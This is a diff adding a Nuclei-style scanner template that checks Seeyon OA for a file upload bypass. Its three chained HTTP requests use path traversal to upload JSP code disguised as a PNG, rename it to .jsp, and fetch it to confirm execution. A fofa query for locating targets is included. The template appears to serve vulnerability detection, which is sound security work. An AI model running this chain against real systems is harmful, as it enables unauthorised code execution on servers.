@@ -1,0 +1,90 @@
+id: seeyon-oa-fileupload-bypass
+
+info:
+  name: Seeyon OA File Upload Bypass Vulnerability
+  author: Co5mos
+  severity: critical
+  description: |
+    致远互联-OA前台 fileUpload.do 存在绕过文件上传漏洞，恶意攻击者可能利用该漏洞上传任意文件，从而执行恶意代码或获取服务器权限。
+  metadata:
+    verified: true
+    fofa-query: app="FE-协作平台" || title="协同管理软件 V5.6SP1"
+  tags: file-upload, seeyon
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+  png_filename: "{{rand_base(6)}}.png"
+  boundary: "{{rand_base(20)}}"
+
+http:
+  - raw:
+    - |
+      POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-Type: multipart/form-data; boundary={{boundary}}
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="type"
+
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="extensions"
+
+      png
+      --{{boundary}}
+      Content-Disposition: form-data; name="applicationCategory"
+
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="destDirectory"
+
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="destFilename"
+
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="maxSize"
+
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="isEncrypt"
+
+      false
+      --{{boundary}}
+      Content-Disposition: form-data; name="file1"; filename="{{png_filename}}"
+      Content-Type: Content-Type: application/pdf
+
+      <% out.print({{num1}}*{{num2}});new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      --{{boundary}}--
+
+    - |
+      POST /seeyon/autoinstall.do/../../seeyon/privilege/menu.do HTTP/1.1
+      Host: {{Hostname}}
+      Content-type: application/x-www-form-urlencoded
+
+      method=uploadMenuIcon&fileid={{fileid}}&filename={{filename}}
+
+    - |
+      GET /seeyon/main/menuIcon/{{filename}} HTTP/1.1
+      Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: fileid
+        group: 1
+        regex:
+          - 'fileurls=fileurls\+","\+.*([[:alnum:]]{19}).;'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_3 == 200
+          - contains(body_3, '{{result}}')
+        condition: and
